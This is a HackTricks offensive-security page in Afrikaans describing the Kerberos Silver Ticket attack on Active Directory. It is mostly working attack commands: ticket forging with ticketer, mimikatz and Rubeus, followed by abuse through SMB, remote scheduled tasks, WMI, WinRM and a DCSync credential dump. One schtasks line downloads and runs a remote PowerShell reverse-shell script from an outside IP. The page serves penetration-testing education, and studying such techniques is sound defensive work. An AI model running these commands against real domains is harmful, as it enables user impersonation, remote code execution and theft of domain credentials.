# Silver Ticket

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **meld aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien bounties tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

Die **Silver Ticket** aanval behels die uitbuiting van dienskaartjies in Active Directory (AD) omgewings. Hierdie metode is gebaseer op **die verkryging van die NTLM-hash van 'n diensrekening**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS) kaartjie te vervals. Met hierdie vervalste kaartjie kan 'n aanvaller toegang verkry tot spesifieke dienste op die netwerk, **om enige gebruiker na te boots**, tipies met die doel om administratiewe voorregte te verkry. Dit word beklemtoon dat die gebruik van AES-sleutels vir die vervalsing van kaartjies veiliger en minder opspoorbaar is.

Vir kaartjie-ontwerp word verskillende gereedskap gebruik, gebaseer op die bedryfstelsel:

### Op Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-vrae.

## Beskikbare Dienste

| Diens Tipe                                 | Diens Silver Tickets                                                      |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhangende van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
| Geplande Take                              | HOST                                                                    |
| Windows Lêer Deel, ook psexec              | CIFS                                                                    |
| LDAP operasies, ingesluit DCSync          | LDAP                                                                    |
| Windows Afgeleë Bediener Administrasie Gereedskap | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
| Goue Kaarte                                | krbtgt                                                                 |

Met **Rubeus** kan jy **vra vir al** hierdie kaarte met die parameter:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver kaarte Gebeurtenis ID's

* 4624: Rekening Aanmelding
* 4634: Rekening Afmelding
* 4672: Admin Aanmelding

## Misbruik van Diens kaarte

In die volgende voorbeelde kom ons veronderstel dat die kaart verkry is deur die administrateur rekening na te volg.

### CIFS

Met hierdie kaart sal jy in staat wees om toegang te verkry tot die `C$` en `ADMIN$` gids via **SMB** (as hulle blootgestel is) en lêers na 'n deel van die afgeleë lêerstelsel te kopieer deur iets soos te doen:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
U sal ook in staat wees om 'n shell binne die gasheer te verkry of arbitrêre opdragte uit te voer met behulp van **psexec**:

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### GASHER

Met hierdie toestemming kan jy geskeduleerde take in afstandrekenaars genereer en arbitrêre opdragte uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Met hierdie kaartjies kan jy **WMI in die slagoffer se stelsel uitvoer**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** in die volgende bladsy:

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Met winrm toegang oor 'n rekenaar kan jy **dit toegang** en selfs 'n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check die volgende bladsy om **meer maniere te leer om met 'n afstands gasheer te verbind met behulp van winrm**:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Let daarop dat **winrm aktief en luisterend moet wees** op die afstands rekenaar om toegang te verkry.
{% endhint %}

### LDAP

Met hierdie voorreg kan jy die DC-databasis dump met behulp van **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Leer meer oor DCSync** in die volgende bladsy:

## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Foutbeloning wenk**: **meld aan** by **Intigriti**, 'n premium **foutbeloning platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
